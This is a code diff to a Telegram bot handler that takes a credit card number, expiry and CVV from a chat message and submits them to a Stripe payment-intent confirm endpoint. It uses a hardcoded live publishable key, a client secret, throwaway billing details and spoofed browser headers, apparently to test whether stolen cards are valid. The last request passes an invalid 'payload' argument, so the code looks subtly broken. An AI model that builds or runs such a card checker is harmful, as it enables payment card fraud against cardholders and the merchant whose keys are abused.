@@ -225,15 +225,53 @@ async def pene(message: types.Message):
     cvv = spli[3]
     m1 = await contra.edit_text(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴]</b>")
 
+    paylod = {
+    'receipt_email': 'djfjdjffj@gmail.com',
+    'payment_method_data[type]': 'card',
+    'payment_method_data[billing_details][email]': 'djfjdjffj@gmail.com',
+    'payment_method_data[billing_details][name]': 'dd',
+    'payment_method_data[billing_details][address][postal_code]': '10081',
+    'payment_method_data[card][number]': cc,
+    'payment_method_data[card][cvc]': cvv,
+    'payment_method_data[card][exp_month]': mes,
+    'payment_method_data[card][exp_year]': ano,
+    'payment_method_data[guid]': 'e97f7c39-c716-4d6f-9bcf-567d84a828419950f7',
+    'payment_method_data[muid]': 'a2e62b85-15c5-4dd1-be12-03b1db1a2396be9b77',
+    'payment_method_data[sid]': '0c3ac9c2-17e9-43a0-9bba-cb1174e25c5e83d67d',
+    'payment_method_data[pasted_fields]': 'number',
+    'payment_method_data[payment_user_agent]': 'stripe.js/ed398fe5b; stripe-js-v3/ed398fe5b',
+    'payment_method_data[time_on_page]': '499164',
+    'expected_payment_method_type': 'card',
+    'use_stripe_sdk': 'true',
+    'key': 'pk_live_DzYuDiszHWOjwN44sVfaT41s',
+    'client_secret': 'pi_3MbaLOJeGhFfMJgC1jwsOBWM_secret_pLuyaWQpQqSY8B7mabt9q0mTY',
+    }
+
     headels = {
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
+    ':authority': 'api.stripe.com',
+    ':method': 'POST',
+    ':path': '/v1/payment_intents/pi_3MbaLOJeGhFfMJgC1jwsOBWM/confirm',
+    ':scheme': 'https',
     'accept': 'application/json',
-    'content-type': 'application/x-www-form-urlencoded'
+    'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'es-ES,es;q=0.9',
+    'content-length': '953',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://js.stripe.com',
+    'referer': 'https://js.stripe.com/',
+    #ec-ch-ua': 'Chromium";v="110", 'Not A(Brand;v='24', 'Google Chrome';v='110',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': 'Windows',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
+    
     }
 
     session = requests.session()
 
-    api201 = session.post("https://api.stripe.com/v1/payment_intents/pi_3MbaLOJeGhFfMJgC1jwsOBWM/confirm", headers=headels).json()
+    api201 = session.post("https://api.stripe.com/v1/payment_intents/pi_3MbaLOJeGhFfMJgC1jwsOBWM/confirm", headers=headels, payload=paylod)
     
     await message.reply(f"{api201}")
 
